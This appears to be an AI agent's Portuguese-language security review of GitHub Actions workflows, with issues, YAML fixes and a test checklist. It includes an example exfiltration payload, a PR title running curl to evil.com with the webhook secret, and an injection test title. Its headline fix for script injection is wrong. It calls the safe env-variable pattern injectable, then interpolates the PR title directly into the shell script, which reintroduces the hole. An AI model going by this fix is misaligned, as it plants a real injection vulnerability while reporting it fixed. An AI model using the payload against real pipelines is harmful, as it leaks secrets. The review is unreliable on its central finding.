# GitHub Workflows - Code Review & Correções

**Data:** 2026-02-11  
**Reviewer:** Orchestrator Agent (DevSecOps + GitHub Actions Expert)  
**Escopo:** `.github/workflows/` + `.github/copilot-instructions.md`

---

## 🎯 Sumário Executivo

**Total de problemas:** 18  
- 🔴 **Críticos:** 5 (Bloqueiam produção)
- 🟡 **Médios:** 9 (Recomendados)
- 🟢 **Baixos:** 4 (Melhorias)

**Workflows Analisados:**
1. `ci-dev-pr.yml` (CI/CD principal)
2. `notify-pr-discord.yml` (Notificações)
3. `perf-benchmarks.yml` (Performance)
4. `sync-kanban-project.yml` (Automação de projeto)

---

## 🔴 **CRÍTICOS** (MUST FIX)

### 1. **Script Injection via PR Title** 🚨

**Workflow:** `notify-pr-discord.yml` (linha 29, 44)  
**Categoria:** Segurança (OWASP CICD-SEC-4)

**❌ Problema:**
```yaml
env:
  PR_TITLE: ${{ github.event.pull_request.title }}
run: |
  --arg title "${PR_TITLE}"  # ❌ INJETÁVEL!
```

**Ataque:**
```
PR Title: Test"; curl http://evil.com?secret=$DISCORD_WEBHOOK_URL_PR #
```

**✅ Correção:**
```yaml
- name: Send PR notification to Discord
  env:
    DISCORD_WEBHOOK_URL_PR: ${{ env.DISCORD_WEBHOOK_URL_PR }}
  run: |
    if [ -z "${DISCORD_WEBHOOK_URL_PR}" ]; then
      echo "DISCORD_WEBHOOK_URL_PR nao configurada. Pulando."
      exit 0
    fi

    # Use jq para escapar JSON (previne injection)
    payload=$(jq -n \
      --arg repo "${{ github.repository }}" \
      --arg title "${{ github.event.pull_request.title }}" \
      --arg url "${{ github.event.pull_request.html_url }}" \
      --arg author "${{ github.event.pull_request.user.login }}" \
      --argjson number ${{ github.event.pull_request.number }} \
      --arg base "${{ github.event.pull_request.base.ref }}" \
      --arg head "${{ github.event.pull_request.head.ref }}" \
      '{
        content: ("[PR #\($number)] \($title)\nAutor: @\($author)\nBranch: \($head) -> \($base)\n\($url)")
      }')

    curl -sS -X POST \
      -H "Content-Type: application/json" \
      -d "${payload}" \
      "${DISCORD_WEBHOOK_URL_PR}"
```

---

### 2. **Secrets Exposure em Environment Variables**

**Workflow:** `ci-dev-pr.yml` (linhas 25-27, 79)  
**Categoria:** Segurança

**❌ Problema:**
```yaml
env:
  SC_DB_PASSWORD: ${{ secrets.SC_DB_PASSWORD }}  # Job-level
  
steps:
  - name: Run migrations
    env:
      PGPASSWORD: ${{ env.SC_DB_PASSWORD }}  # ❌ Exposto em logs se set -x
```

**✅ Correção:**
```yaml
jobs:
  validate:
    runs-on: ubuntu-latest
    # ❌ NÃO declare secrets em job-level env
    
    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Get Secrets from Bitwarden
        uses: bitwarden/sm-action@v2
        with:
          access_token: ${{ secrets.BW_ACCESS_TOKEN }}
          secrets: |
            da849b99-fe62-496a-9357-b3e80047b6c1 > SC_DB_USER
            2773679e-367a-40e8-bbc5-b3e80047d48b > SC_DB_PASSWORD
            40250cc3-8ecf-4842-8d4f-b3e80047e968 > SC_DB_NAME

      # ✅ Use env SOMENTE quando necessário e em step-level
      - name: Run migrations
        env:
          PGPASSWORD: ${{ env.SC_DB_PASSWORD }}
          SC_DB_HOST: 127.0.0.1
          SC_DB_PORT: "5432"
        run: |
          # Migrations aqui
```

---

### 3. **PostgreSQL Service sem Health Check**

**Workflow:** `ci-dev-pr.yml` (linhas 29-36)  
**Categoria:** Confiabilidade

**❌ Problema:**
```yaml
services:
  postgres:
    image: postgres:17-alpine
    # ❌ FALTA health check
    # Wait manual pode falhar (linhas 66-75)
```

**✅ Correção:**
```yaml
services:
  postgres:
    image: postgres:17-alpine
    env:
      POSTGRES_USER: postgres
      POSTGRES_PASSWORD: postgres
      POSTGRES_DB: testdb
    ports:
      - 5432:5432
    options: >-
      --health-cmd pg_isready
      --health-interval 10s
      --health-timeout 5s
      --health-retries 5

# ✅ Remove step "Wait for Postgres" — GitHub aguarda automaticamente
```

---

### 4. **Bitwarden UUIDs Hardcoded (DRY Violation)**

**Workflow:** Todos (ci-dev-pr, notify-pr, sync-kanban)  
**Categoria:** Manutenibilidade + Segurança

**❌ Problema:**
```yaml
# Repetido em 3 workflows diferentes
secrets: |
  da849b99-fe62-496a-9357-b3e80047b6c1 > SC_DB_USER
  2773679e-367a-40e8-bbc5-b3e80047d48b > SC_DB_PASSWORD
```

**✅ Correção:**
Crie **composite action**:

```yaml
# .github/actions/get-bitwarden-secrets/action.yml
name: Get Bitwarden Secrets
description: Centraliza busca de secrets do Bitwarden

inputs:
  access_token:
    required: true
  secrets_list:
    required: true

runs:
  using: composite
  steps:
    - name: Get Secrets from Bitwarden
      uses: bitwarden/sm-action@v2
      with:
        access_token: ${{ inputs.access_token }}
        secrets: ${{ inputs.secrets_list }}
```

**Uso nos workflows:**
```yaml
- name: Get Bitwarden Secrets
  uses: ./.github/actions/get-bitwarden-secrets
  with:
    access_token: ${{ secrets.BW_ACCESS_TOKEN }}
    secrets_list: |
      da849b99-fe62-496a-9357-b3e80047b6c1 > SC_DB_USER
      2773679e-367a-40e8-bbc5-b3e80047d48b > SC_DB_PASSWORD
      40250cc3-8ecf-4842-8d4f-b3e80047e968 > SC_DB_NAME
```

---

### 5. **GITHUB_TOKEN Permissions (Least Privilege)**

**Workflow:** `sync-kanban-project.yml` (linhas 19-22)  
**Categoria:** Segurança (OWASP CICD-SEC-5)

**❌ Problema:**
```yaml
permissions:
  contents: read
  issues: write
  repository-projects: write  # ❌ Desnecessário se usa PAT
```

**✅ Correção:**
```yaml
permissions:
  contents: read  # Apenas para checkout
  # PROJECT_SYNC_TOKEN (PAT) já tem scopes necessários
```

---

## 🟡 **MÉDIOS** (Recomendados)

### 6. **Versão do Bun Inconsistente**

**Problema:** `ci-dev-pr.yml` usa 1.3.8, `perf-benchmarks.yml` usa 1.3.1

**Correção:**
```yaml
# Centralize em variável ou leia do package.json
- name: Setup Bun
  uses: oven-sh/setup-bun@v2
  with:
    bun-version: "1.3.8"  # Mesmo em todos
```

---

### 7. **Falta Caching de Dependências**

**Problema:** `bun install` sem cache (30-60s por run)

**Correção:**
```yaml
- name: Cache Bun dependencies
  uses: actions/cache@v4
  with:
    path: ~/.bun/install/cache
    key: ${{ runner.os }}-bun-${{ hashFiles('bun.lock') }}
    restore-keys: |
      ${{ runner.os }}-bun-

- name: Install dependencies
  run: bun install --frozen-lockfile
```

---

### 8. **Continue-on-error Silencioso**

**Problema:** Lint errors ignorados sem feedback

**Correção:**
```yaml
- name: Lint
  id: lint
  continue-on-error: true
  run: bun run lint

- name: Comment lint warnings
  if: failure() && steps.lint.outcome == 'failure'
  uses: actions/github-script@v7
  with:
    script: |
      github.rest.issues.createComment({
        issue_number: context.issue.number,
        owner: context.repo.owner,
        repo: context.repo.repo,
        body: '⚠️ Lint falhou. Revise antes de mergear.'
      })
```

---

### 9. **Falta Artifacts de Teste**

**Correção:**
```yaml
- name: Run tests
  run: bun test --coverage --json-report=./test-results.json

- name: Upload test results
  if: always()
  uses: actions/upload-artifact@v4
  with:
    name: test-results-${{ github.run_id }}
    path: |
      test-results.json
      coverage/
    retention-days: 30
```

---

### 10. **Migration Script Não-Idempotente**

**Correção:**
```yaml
- name: Run migrations
  run: |
    # Drop/recreate para CI (idempotente)
    psql -h "${SC_DB_HOST}" -U postgres -c "DROP DATABASE IF EXISTS ${SC_DB_NAME};"
    psql -h "${SC_DB_HOST}" -U postgres -c "CREATE DATABASE ${SC_DB_NAME};"
    
    for file in migrations/*.sql; do
      psql -v ON_ERROR_STOP=1 -h "${SC_DB_HOST}" -U "${SC_DB_USER}" -d "${SC_DB_NAME}" -f "${file}"
    done
```

---

### 11. **Falta workflow_dispatch em CI**

**Correção:**
```yaml
on:
  pull_request:
    types: [opened, synchronize, reopened, ready_for_review]
  workflow_dispatch:
    inputs:
      ref:
        description: Branch to test
        default: main
```

---

### 12. **Discord Webhook URL Sem Validação**

**Correção:**
```yaml
- name: Validate webhook URL
  run: |
    if ! echo "${DISCORD_WEBHOOK_URL_PR}" | grep -qE '^https://discord(app)?\.com/api/webhooks/'; then
      echo "ERRO: DISCORD_WEBHOOK_URL_PR invalida"
      exit 1
    fi
```

---

### 13. **Hardcoded Repository Info**

**Correção:**
```yaml
env:
  REPO: ${{ github.repository }}
  PROJECT_OWNER: ${{ github.repository_owner }}
  PROJECT_NUMBER: "10"  # Mover para repository variable
```

---

### 14. **Falta Rate Limiting no Discord**

Prevenção de abuse (100 PRs = flood).

---

## 🟢 **BAIXOS** (Melhorias)

### 15. Runner Version Pinning
### 16. Job Summary (`$GITHUB_STEP_SUMMARY`)
### 17. Benchmark Results Artifacts
### 18. Concurrency Groups

---

## 📋 **Checklist de Implementação**

### Fase 1: Críticos (Hoje)
- [ ] #1 - Corrigir script injection (notify-pr-discord)
- [ ] #2 - Remover secrets de job-level env
- [ ] #3 - Adicionar health check no PostgreSQL service
- [ ] #4 - Criar composite action para Bitwarden
- [ ] #5 - Ajustar permissions

### Fase 2: Médios (Esta Sprint)
- [ ] #7 - Adicionar caching Bun
- [ ] #8 - Lint error visibility
- [ ] #9 - Upload test artifacts
- [ ] #10 - Migration idempotence

### Fase 3: Melhorias (Backlog)
- [ ] Restante dos 🟡 e 🟢

---

## 🧪 **Como Testar**

```bash
# 1. Validar sintaxe YAML
yamllint .github/workflows/*.yml

# 2. Testar workflow localmente (act)
act pull_request -j validate

# 3. Teste de script injection
# Crie PR com título: Test"; echo "HACKED" #
# ✅ Deve aparecer literalmente no Discord, NÃO executar

# 4. Verificar permissions
gh api repos/:owner/:repo/actions/permissions

# 5. Testar cache
# Rodar CI 2x, segundo run deve ser 30s+ mais rápido
```

---

## 🎯 **Prioridades**

**Bloqueadores de Produção:**
1. Script injection (#1)
2. Secrets exposure (#2)
3. PostgreSQL health check (#3)

**Esta Sprint:**
- Bitwarden centralization (#4)
- Caching (#7)
- Lint visibility (#8)

---

**Relatório Completo:** Este arquivo  
**Referências:** OWASP Top 10 CI/CD Security Risks
